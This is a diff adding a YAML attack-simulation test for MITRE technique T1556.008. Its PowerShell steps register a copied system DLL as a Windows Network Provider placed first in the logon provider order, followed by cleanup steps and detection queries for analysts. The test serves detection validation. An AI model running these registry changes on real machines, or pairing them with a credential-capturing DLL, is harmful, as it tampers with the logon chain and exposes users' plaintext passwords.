@@ -1,0 +1,98 @@
+id: T1556.008_modify_auth_network_provider_dll
+name: "Modify Authentication Process — Network Provider DLL"
+mitre_technique: "T1556.008"
+mitre_tactic: "persistence"
+description: >
+  Adversaries register a malicious DLL as a Windows Network Provider to capture
+  cleartext credentials during the logon process. Network provider DLLs are called
+  by Winlogon via mpnotify.exe — they receive the user's plaintext credentials at
+  logon. Legitimate providers include NTLM (ntlanman.dll) and Kerberos. Providers
+  are registered under HKLM\SYSTEM\CurrentControlSet\Services\<name>\NetworkProvider
+  and listed in HKLM\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order\ProviderOrder.
+  This is a more targeted credential capture mechanism than password filter DLLs.
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1556/008/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Pre-execution context"
+    message: "Starting T1556.008 — Network Provider DLL credential capture simulation"
+
+  - step: 2
+    type: exec_powershell
+    description: "Read current network provider order — establish baseline"
+    command: |
+      $orderKey = "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order"
+      $order    = (Get-ItemProperty $orderKey -Name ProviderOrder).ProviderOrder
+      Write-Host "[PAS] Current Network Provider Order: $order"
+      Write-Host "[PAS] Legitimate providers: LanmanWorkstation,RDPNP,webclient (may vary)"
+
+  - step: 3
+    type: exec_powershell
+    description: "Register malicious network provider DLL"
+    command: |
+      $malDll  = "$env:SystemRoot\System32\PAS_T1556_008_netprovider.dll"
+      Copy-Item "$env:SystemRoot\System32\ntlanman.dll" $malDll `
+          -Force -ErrorAction SilentlyContinue
+
+      # Register the provider service
+      $svcKey = "HKLM:\SYSTEM\CurrentControlSet\Services\PAS_T1556_008_NetProv"
+      New-Item -Path "$svcKey\NetworkProvider" -Force | Out-Null
+      Set-ItemProperty "$svcKey\NetworkProvider" -Name "ProviderPath" -Value $malDll
+      Set-ItemProperty "$svcKey\NetworkProvider" -Name "Name"         -Value "PAS_T1556_008_NetProv"
+
+      # Add to provider order (first in list gets credentials first)
+      $orderKey = "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order"
+      $current  = (Get-ItemProperty $orderKey -Name ProviderOrder).ProviderOrder
+      Set-ItemProperty $orderKey -Name ProviderOrder -Value "PAS_T1556_008_NetProv,$current"
+
+      Write-Host "[PAS] Malicious network provider registered: PAS_T1556_008_NetProv"
+      Write-Host "[PAS] Added first in ProviderOrder — receives credentials before legitimate providers"
+      Write-Host "[PAS] Called by mpnotify.exe with PLAINTEXT credentials at logon"
+
+  - step: 4
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 3
+
+  - step: 5
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check SIEM — new entry in HKLM\\...\\NetworkProvider\\Order ProviderOrder value"
+
+cleanup:
+  - step: 1
+    type: exec_powershell
+    description: "Remove network provider registry entries and DLL"
+    command: |
+      # Restore provider order
+      $orderKey = "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order"
+      $current  = (Get-ItemProperty $orderKey -Name ProviderOrder).ProviderOrder
+      $restored = ($current -replace "PAS_T1556_008_NetProv,", "") -replace ",PAS_T1556_008_NetProv", ""
+      Set-ItemProperty $orderKey -Name ProviderOrder -Value $restored
+      Write-Host "[PAS][Cleanup] Provider order restored: $restored"
+
+      # Remove provider service key
+      Remove-Item "HKLM:\SYSTEM\CurrentControlSet\Services\PAS_T1556_008_NetProv" `
+          -Recurse -Force -ErrorAction SilentlyContinue
+      Remove-Item "$env:SystemRoot\System32\PAS_T1556_008_netprovider.dll" `
+          -Force -ErrorAction SilentlyContinue
+      Write-Host "[PAS][Cleanup] Network provider DLL and registry removed"
+
+  - step: 2
+    type: marker
+    description: "Cleanup complete"
+    message: "T1556.008 cleanup complete"
+
+analyst_checklist:
+  - "Registry event: ProviderOrder value modified under HKLM\\...\\NetworkProvider\\Order"
+  - "Registry event: new NetworkProvider key created under HKLM\\...\\Services"
+  - "Sentinel: DeviceRegistryEvents | where RegistryKey contains 'NetworkProvider\\\\Order' and RegistryValueName == 'ProviderOrder'"
+  - "Sentinel: DeviceRegistryEvents | where RegistryKey contains 'NetworkProvider' and ActionType == 'RegistryKeyCreated'"
+  - "MDE alert: 'Network provider DLL registered for credential capture'"
+  - "CONTROL CHECK: Baseline ProviderOrder — alert on any new provider not in approved list"
+  - "CONTROL CHECK: Credential Guard protects credentials from network provider DLLs"
